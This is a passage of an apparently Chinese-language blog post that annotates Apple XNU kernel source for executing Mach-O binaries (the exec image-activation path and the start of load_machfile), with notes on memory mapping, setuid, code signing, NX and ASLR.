通过fork，为macho生成一个新的线程</span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		if (vfexec) &#123;</span><br><span class="line">			imgp-&gt;ip_new_thread = fork_create_child(task, NULL, p, FALSE, (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT));</span><br><span class="line">			if (imgp-&gt;ip_new_thread == NULL) &#123;</span><br><span class="line">				error = ENOMEM;</span><br><span class="line">				goto bad;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		/* reset local idea of thread, uthread, task */</span><br><span class="line">		thread = imgp-&gt;ip_new_thread;</span><br><span class="line">		uthread = get_bsdthread_info(thread);</span><br><span class="line">		task = new_task = get_threadtask(thread);</span><br><span class="line">		map = get_task_map(task);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		map = VM_MAP_NULL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * We set these flags here; this is OK, since if we fail after</span><br><span class="line">	 * this point, we have already destroyed the parent process anyway.</span><br><span class="line">	 */</span><br><span class="line">    // 设置一些dyld需要使用的参数</span><br><span class="line">	task_set_dyld_info(task, MACH_VM_MIN_ADDRESS, 0);</span><br><span class="line">	if (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) &#123;</span><br><span class="line">		task_set_64bit(task, TRUE);</span><br><span class="line">		OSBitOrAtomic(P_LP64, &amp;p-&gt;p_flag);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		task_set_64bit(task, FALSE);</span><br><span class="line">		OSBitAndAtomic(~((uint32_t)P_LP64), &amp;p-&gt;p_flag);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 *	Load the Mach-O file.</span><br><span class="line">	 *</span><br><span class="line">	 * NOTE: An error after this point  indicates we have potentially</span><br><span class="line">	 * destroyed or overwritten some process state while attempting an</span><br><span class="line">	 * execve() following a vfork(), which is an unrecoverable condition.</span><br><span class="line">	 * We send the new process an immediate SIGKILL to avoid it executing</span><br><span class="line">	 * any instructions in the mutated address space. For true spawns,</span><br><span class="line">	 * this is not the case, and "too late" is still not too late to</span><br><span class="line">	 * return an error code to the parent process.</span><br><span class="line">	 */</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Actually load the image file we previously decided to load.</span><br><span class="line">	 */</span><br><span class="line">    //加载，映射macho文件到内存</span><br><span class="line">	lret = load_machfile(imgp, mach_header, thread, map, &amp;load_result);</span><br><span class="line"></span><br><span class="line">	if (lret != LOAD_SUCCESS) &#123;</span><br><span class="line">		error = load_return_to_errno(lret);</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	p-&gt;p_cputype = imgp-&gt;ip_origcputype;</span><br><span class="line">	p-&gt;p_cpusubtype = imgp-&gt;ip_origcpusubtype;</span><br><span class="line">	proc_unlock(p);</span><br><span class="line"></span><br><span class="line">	vm_map_set_user_wire_limit(get_task_map(task), p-&gt;p_rlimit[RLIMIT_MEMLOCK].rlim_cur);</span><br><span class="line"></span><br><span class="line">	/* </span><br><span class="line">	 * Set code-signing flags if this binary is signed, or if parent has</span><br><span class="line">	 * requested them on exec.</span><br><span class="line">	 */</span><br><span class="line">  	//设置了一堆标记位</span><br><span class="line">    //需要关心一下的是这里和code-signgin有点关系</span><br><span class="line">	if (load_result.csflags &amp; CS_VALID) &#123;</span><br><span class="line">		imgp-&gt;ip_csflags |= load_result.csflags &amp; </span><br><span class="line">			(CS_VALID|</span><br><span class="line">			 CS_HARD|CS_KILL|CS_RESTRICT|CS_ENFORCEMENT|CS_REQUIRE_LV|CS_DYLD_PLATFORM|</span><br><span class="line">			 CS_EXEC_SET_HARD|CS_EXEC_SET_KILL|CS_EXEC_SET_ENFORCEMENT);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		imgp-&gt;ip_csflags &amp;= ~CS_VALID;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_HARD)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_HARD;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_KILL)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_KILL;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_ENFORCEMENT)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_ENFORCEMENT;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_INSTALLER)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_INSTALLER;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Set up the system reserved areas in the new address space.</span><br><span class="line">	 */</span><br><span class="line">    //依据可执行文件的平台，设置合适的执行环境</span><br><span class="line">	vm_map_exec(get_task_map(task),</span><br><span class="line">		    task,</span><br><span class="line">		    (void *) p-&gt;p_fd-&gt;fd_rdir,</span><br><span class="line">		    cpu_type());</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	 * Close file descriptors which specify close-on-exec.</span><br><span class="line">	 */</span><br><span class="line">    //关闭所有被标记为close-on-exec的文件</span><br><span class="line">	fdexec(p, psa != NULL ? psa-&gt;psa_flags : 0);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * deal with set[ug]id.</span><br><span class="line">	 */</span><br><span class="line">  	//处理setuid相关的逻辑，和权限相关</span><br><span class="line">	error = exec_handle_sugid(imgp);</span><br><span class="line">	if (error) &#123;</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * deal with voucher on exec-calling thread.</span><br><span class="line">	 */</span><br><span class="line">	if (imgp-&gt;ip_new_thread == NULL)</span><br><span class="line">		thread_set_mach_voucher(current_thread(), IPC_VOUCHER_NULL);</span><br><span class="line"></span><br><span class="line">	/* Make sure we won't interrupt ourself signalling a partial process */</span><br><span class="line">	if (!vfexec &amp;&amp; !spawn &amp;&amp; (p-&gt;p_lflag &amp; P_LTRACED))</span><br><span class="line">		psignal(p, SIGTRAP);</span><br><span class="line">	</span><br><span class="line">  	//为进程设置应用层的栈地址</span><br><span class="line">	if (load_result.unixproc &amp;&amp;</span><br><span class="line">		create_unix_stack(get_task_map(task),</span><br><span class="line">				  &amp;load_result,</span><br><span class="line">				  p) != KERN_SUCCESS) &#123;</span><br><span class="line">		error = load_return_to_errno(LOAD_NOSPACE);</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		old_map = vm_map_switch(get_task_map(task));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (load_result.unixproc) &#123;</span><br><span class="line">		user_addr_t	ap;</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		 * Copy the strings area out into the new process address</span><br><span class="line">		 * space.</span><br><span class="line">		 */</span><br><span class="line">		ap = p-&gt;user_stack;</span><br><span class="line">		error = exec_copyout_strings(imgp, &amp;ap);</span><br><span class="line">		if (error) &#123;</span><br><span class="line">			if (vfexec || spawn)</span><br><span class="line">				vm_map_switch(old_map);</span><br><span class="line">			goto badtoolate;</span><br><span class="line">		&#125;</span><br><span class="line">		/* Set the stack */</span><br><span class="line">		thread_setuserstack(thread, ap);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if (load_result.dynlinker) &#123;</span><br><span class="line">		uint64_t	ap;</span><br><span class="line">		int			new_ptr_size = (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) ? 8 : 4;</span><br><span class="line"></span><br><span class="line">		/* Adjust the stack */</span><br><span class="line">		ap = thread_adjuserstack(thread, -new_ptr_size);</span><br><span class="line">		error = copyoutptr(load_result.mach_header, ap, new_ptr_size);</span><br><span class="line"></span><br><span class="line">		if (error) &#123;</span><br><span class="line">			if (vfexec || spawn)</span><br><span class="line">				vm_map_switch(old_map);</span><br><span class="line">			goto badtoolate;</span><br><span class="line">		&#125;</span><br><span class="line">		task_set_dyld_info(task, load_result.all_image_info_addr,</span><br><span class="line">		    load_result.all_image_info_size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Avoid immediate VM faults back into kernel */</span><br><span class="line">  	//防止立刻执行指令导致的错误，做了大量和dyld相关的事情</span><br><span class="line">	exec_prefault_data(p, imgp, &amp;load_result);</span><br><span class="line"></span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		vm_map_switch(old_map);</span><br><span class="line">	&#125;</span><br><span class="line">	/* Set the entry point */</span><br><span class="line">	thread_setentrypoint(thread, load_result.entry_point);</span><br><span class="line"></span><br><span class="line">	/* Stop profiling */</span><br><span class="line">	stopprofclock(p);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Reset signal state.</span><br><span class="line">	 */</span><br><span class="line">	execsigs(p, thread);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * need to cancel async IO requests that can be cancelled and wait for those</span><br><span class="line">	 * already active.  MAY BLOCK!</span><br><span class="line">	 */</span><br><span class="line">	_aio_exec( p );</span><br><span class="line"></span><br><span class="line">#if SYSV_SHM</span><br><span class="line">	/* FIXME: Till vmspace inherit is fixed: */</span><br><span class="line">	if (!vfexec &amp;&amp; p-&gt;vm_shm)</span><br><span class="line">		shmexec(p);</span><br><span class="line">#endif</span><br><span class="line">#if SYSV_SEM</span><br><span class="line">	/* Clean up the semaphores */</span><br><span class="line">	semexit(p);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Remember file name for accounting.</span><br><span class="line">	 */</span><br><span class="line">	p-&gt;p_acflag &amp;= ~AFORK;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Set p-&gt;p_comm and p-&gt;p_name to the name passed to exec</span><br><span class="line">	 */</span><br><span class="line">	p_name_len = sizeof(p-&gt;p_name) - 1;</span><br><span class="line">	if(imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen &gt; p_name_len)</span><br><span class="line">		imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen = p_name_len;</span><br><span class="line">	bcopy((caddr_t)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_nameptr, (caddr_t)p-&gt;p_name,</span><br><span class="line">		(unsigned)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen);</span><br><span class="line">	p-&gt;p_name[imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen] = '\0';</span><br><span class="line"></span><br><span class="line">	if (imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen &gt; MAXCOMLEN)</span><br><span class="line">		imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen = MAXCOMLEN;</span><br><span class="line">	bcopy((caddr_t)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_nameptr, (caddr_t)p-&gt;p_comm,</span><br><span class="line">		(unsigned)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen);</span><br><span class="line">	p-&gt;p_comm[imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen] = '\0';</span><br><span class="line"></span><br><span class="line">	pal_dbg_set_task_name( p-&gt;task );</span><br><span class="line"></span><br><span class="line">#if DEVELOPMENT || DEBUG</span><br><span class="line">	/* </span><br><span class="line">	 * Update the pid an proc name for importance base if any</span><br><span class="line">	 */</span><br><span class="line">	task_importance_update_owner_info(p-&gt;task);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	memcpy(&amp;p-&gt;p_uuid[0], &amp;load_result.uuid[0], sizeof(p-&gt;p_uuid));</span><br><span class="line"></span><br><span class="line">// &lt;rdar://6598155&gt; dtrace code cleanup needed</span><br><span class="line">#if CONFIG_DTRACE</span><br><span class="line">	/*</span><br><span class="line">	 * Invalidate any predicate evaluation already cached for this thread by DTrace.</span><br><span class="line">	 * That's because we've just stored to p_comm and DTrace refers to that when it</span><br><span class="line">	 * evaluates the "execname" special variable. uid and gid may have changed as well.</span><br><span class="line">	 */</span><br><span class="line">	dtrace_set_thread_predcache(current_thread(), 0);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Free any outstanding lazy dof entries. It is imperative we</span><br><span class="line">	 * always call dtrace_lazy_dofs_destroy, rather than null check</span><br><span class="line">	 * and call if !NULL. If we NULL test, during lazy dof faulting</span><br><span class="line">	 * we can race with the faulting code and proceed from here to</span><br><span class="line">	 * beyond the helpers cleanup. The lazy dof faulting will then</span><br><span class="line">	 * install new helpers which no longer belong to this process!</span><br><span class="line">	 */</span><br><span class="line">	dtrace_lazy_dofs_destroy(p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">    	 * Clean up any DTrace helpers for the process.</span><br><span class="line">    	 */</span><br><span class="line">    	if (p-&gt;p_dtrace_helpers != NULL &amp;&amp; dtrace_helpers_cleanup) &#123;</span><br><span class="line">    		(*dtrace_helpers_cleanup)(p);</span><br><span class="line">    	&#125;</span><br><span class="line">	</span><br><span class="line">    	/*</span><br><span class="line">    	 * Cleanup the DTrace provider associated with this process.</span><br><span class="line">    	 */</span><br><span class="line">	proc_lock(p);</span><br><span class="line">	if (p-&gt;p_dtrace_probes &amp;&amp; dtrace_fasttrap_exec_ptr) &#123;</span><br><span class="line">		(*dtrace_fasttrap_exec_ptr)(p);</span><br><span class="line">	&#125;</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	if (kdebug_enable) &#123;</span><br><span class="line">		long dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4;</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		 * Collect the pathname for tracing</span><br><span class="line">		 */</span><br><span class="line">		kdbg_trace_string(p, &amp;dbg_arg1, &amp;dbg_arg2, &amp;dbg_arg3, &amp;dbg_arg4);</span><br><span class="line"></span><br><span class="line">		if (vfexec || spawn) &#123;</span><br><span class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_DATA_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					p-&gt;p_pid ,0,0,0, (uintptr_t)thread_tid(thread));</span><br><span class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_STRING_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, (uintptr_t)thread_tid(thread));</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			KERNEL_DEBUG_CONSTANT(TRACE_DATA_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					p-&gt;p_pid ,0,0,0,0);</span><br><span class="line">			KERNEL_DEBUG_CONSTANT(TRACE_STRING_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, 0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * If posix_spawned with the START_SUSPENDED flag, stop the</span><br><span class="line">	 * process before it runs.</span><br><span class="line">	 */</span><br><span class="line">	if (imgp-&gt;ip_px_sa != NULL) &#123;</span><br><span class="line">		psa = (struct _posix_spawnattr *) imgp-&gt;ip_px_sa;</span><br><span class="line">		if (psa-&gt;psa_flags &amp; POSIX_SPAWN_START_SUSPENDED) &#123;</span><br><span class="line">			proc_lock(p);</span><br><span class="line">			p-&gt;p_stat = SSTOP;</span><br><span class="line">			proc_unlock(p);</span><br><span class="line">			(void) task_suspend_internal(p-&gt;task);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * mark as execed, wakeup the process that vforked (if any) and tell</span><br><span class="line">	 * it that it now has its own resources back</span><br><span class="line">	 */</span><br><span class="line">	OSBitOrAtomic(P_EXEC, &amp;p-&gt;p_flag);</span><br><span class="line">	proc_resetregister(p);</span><br><span class="line">	if (p-&gt;p_pptr &amp;&amp; (p-&gt;p_lflag &amp; P_LPPWAIT)) &#123;</span><br><span class="line">		proc_lock(p);</span><br><span class="line">		p-&gt;p_lflag &amp;= ~P_LPPWAIT;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		wakeup((caddr_t)p-&gt;p_pptr);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Pay for our earlier safety; deliver the delayed signals from</span><br><span class="line">	 * the incomplete vfexec process now that it's complete.</span><br><span class="line">	 */</span><br><span class="line">	if (vfexec &amp;&amp; (p-&gt;p_lflag &amp; P_LTRACED)) &#123;</span><br><span class="line">		psignal_vfork(p, new_task, thread, SIGTRAP);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	goto done;</span><br><span class="line"></span><br><span class="line">badtoolate:</span><br><span class="line">	/* Don't allow child process to execute any instructions */</span><br><span class="line">	if (!spawn) &#123;</span><br><span class="line">		if (vfexec) &#123;</span><br><span class="line">			psignal_vfork(p, new_task, thread, SIGKILL);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			psignal(p, SIGKILL);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		/* We can't stop this system call at this point, so just pretend we succeeded */</span><br><span class="line">		error = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">done:</span><br><span class="line">	if (!spawn) &#123;</span><br><span class="line">		/* notify only if it has not failed due to FP Key error */</span><br><span class="line">		if ((p-&gt;p_lflag &amp; P_LTERM_DECRYPTFAIL) == 0)</span><br><span class="line">			proc_knote(p, NOTE_EXEC);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Drop extra references for cases where we don't expect the caller to clean up */</span><br><span class="line">	if (vfexec || (spawn &amp;&amp; error == 0)) &#123;</span><br><span class="line">		task_deallocate(new_task);</span><br><span class="line">		thread_deallocate(thread);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	return(error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数主要做这几件事情：</p>
<ul>
<li>对macho文件做最基本的检测</li>
<li><code>fork</code>新的线程运行macho</li>
<li>映射macho文件到内存中</li>
<li>对setuid，code-sign等权限相关的事情有处理</li>
<li>为dyld接手macho文件的处理做了大量的准备工作</li>
<li>dyld处理完之后，对资源的释放</li>
</ul>
<h2 id="1-4_load_machfile">1.4 load_machfile</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load_return_t</span></span><br><span class="line">load_machfile(</span><br><span class="line">	<span class="keyword">struct</span> image_params	*imgp,</span><br><span class="line">	<span class="keyword">struct</span> mach_header	*header,</span><br><span class="line">	<span class="keyword">thread_t</span> 		thread,</span><br><span class="line">	<span class="keyword">vm_map_t</span> 		new_map,</span><br><span class="line">	<span class="keyword">load_result_t</span>		*result</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> vnode		*vp = imgp-&gt;ip_vp;</span><br><span class="line">	<span class="keyword">off_t</span>			file_offset = imgp-&gt;ip_arch_offset;</span><br><span class="line">	<span class="keyword">off_t</span>			macho_size = imgp-&gt;ip_arch_size;</span><br><span class="line">	<span class="keyword">off_t</span>			file_size = imgp-&gt;ip_vattr-&gt;va_data_size;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">pmap_t</span>			pmap = <span class="number">0</span>;	<span class="comment">/* protected by create_map */</span></span><br><span class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>;</span><br><span class="line">	<span class="keyword">vm_map_t</span>		old_map;</span><br><span class="line">	<span class="keyword">task_t</span>			old_task = TASK_NULL; <span class="comment">/* protected by create_map */</span></span><br><span class="line">	<span class="keyword">load_result_t</span>		myresult;</span><br><span class="line">	<span class="keyword">load_return_t</span>		lret;</span><br><span class="line">	<span class="keyword">boolean_t</span> create_map = FALSE;</span><br><span class="line">	<span class="keyword">boolean_t</span> enforce_hard_pagezero = TRUE;</span><br><span class="line">	<span class="keyword">int</span> spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</span><br><span class="line">	<span class="keyword">task_t</span> task = current_task();</span><br><span class="line">	<span class="keyword">proc_t</span> p = current_proc();</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	aslr_offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	dyld_aslr_offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">kern_return_t</span> 		kret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (macho_size &gt; file_size) &#123;</span><br><span class="line">		<span class="keyword">return</span>(LOAD_BADMACHO);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (new_map == VM_MAP_NULL) &#123;</span><br><span class="line">		create_map = TRUE;</span><br><span class="line">		old_task = current_task();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * If we are spawning, we have created backing objects for the process</span><br><span class="line">	 * already, which include non-lazily creating the task map.  So we</span><br><span class="line">	 * are going to switch out the task map with one appropriate for the</span><br><span class="line">	 * bitness of the image being loaded.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (spawn) &#123;</span><br><span class="line">		create_map = TRUE;</span><br><span class="line">		old_task = get_threadtask(thread);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">//如果有new_map就用参数传进来的new_map</span></span><br><span class="line">  	<span class="comment">//否则就通过pmap_create,vm_map_create函数创建新的内存空间</span></span><br><span class="line">	<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">		<span class="keyword">task_t</span> ledger_task;</span><br><span class="line">		<span class="keyword">if</span> (imgp-&gt;ip_new_thread) &#123;</span><br><span class="line">			ledger_task = get_threadtask(imgp-&gt;ip_new_thread);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ledger_task = task;</span><br><span class="line">		&#125;</span><br><span class="line">		pmap = pmap_create(get_task_ledger(ledger_task),</span><br><span class="line">				   (<span class="keyword">vm_map_size_t</span>) <span class="number">0</span>,</span><br><span class="line">				   ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) != <span class="number">0</span>));</span><br><span class="line">		pal_switch_pmap(thread, pmap, imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT);</span><br><span class="line">		<span class="built_in">map</span> = vm_map_create(pmap,</span><br><span class="line">				<span class="number">0</span>,</span><br><span class="line">				vm_compute_max_offset(((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == IMGPF_IS_64BIT)),</span><br><span class="line">				TRUE);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">map</span> = new_map;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span>   (__ARM_ARCH_7K__ &gt;= <span class="number">2</span>) &amp;&amp; defined(PLATFORM_WatchOS)</span></span><br><span class="line">	<span class="comment">/* enforce 16KB alignment for watch targets with new ABI */</span></span><br><span class="line">	vm_map_set_page_shift(<span class="built_in">map</span>, SIXTEENK_PAGE_SHIFT);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span> <span class="comment">/* __arm64__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span>	CONFIG_ENFORCE_SIGNED_CODE</span></span><br><span class="line">	<span class="comment">/* This turns off faulting for executable pages, which allows</span><br><span class="line">	 * to circumvent Code Signing Enforcement. The per process</span><br><span class="line">	 * flag (CS_ENFORCEMENT) is not set yet, but we can use the</span><br><span class="line">	 * global flag.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ( !cs_enforcement(<span class="literal">NULL</span>) &amp;&amp; (header-&gt;flags &amp; MH_ALLOW_STACK_EXECUTION) )</span><br><span class="line">	        vm_map_disable_NX(<span class="built_in">map</span>);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Forcibly disallow execution from data pages on even if the arch</span><br><span class="line">	 * normally permits it. */</span></span><br><span class="line">  	<span class="comment">//将内存设置为不可执行，用来防止溢出漏洞的利用</span></span><br><span class="line">	<span class="keyword">if</span> ((header-&gt;flags &amp; MH_NO_HEAP_EXECUTION) &amp;&amp; !(imgp-&gt;ip_flags &amp; IMGPF_ALLOW_DATA_EXEC))</span><br><span class="line">		vm_map_disallow_data_exec(<span class="built_in">map</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Compute a random offset for ASLR, and an independent random offset for dyld.</span><br><span class="line">	 */</span></span><br><span class="line">  	<span class="comment">//地址随机，计算ASLR的偏移量</span></span><br><span class="line">	<span class="keyword">if</span> (!(imgp-&gt;ip_flags &amp; IMGPF_DISABLE_ASLR)) &#123;</span><br><span class="line">		<span class="keyword">uint64_t</span> max_slide_pages;</span><br><span class="line"></span><br><span class="line">		max_slide_pages = vm_map_get_max_aslr_slide_pages(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">		aslr_offset = random();</span><br><span class="line">		aslr_offset %= max_slide_pages;</span><br><span class="line">		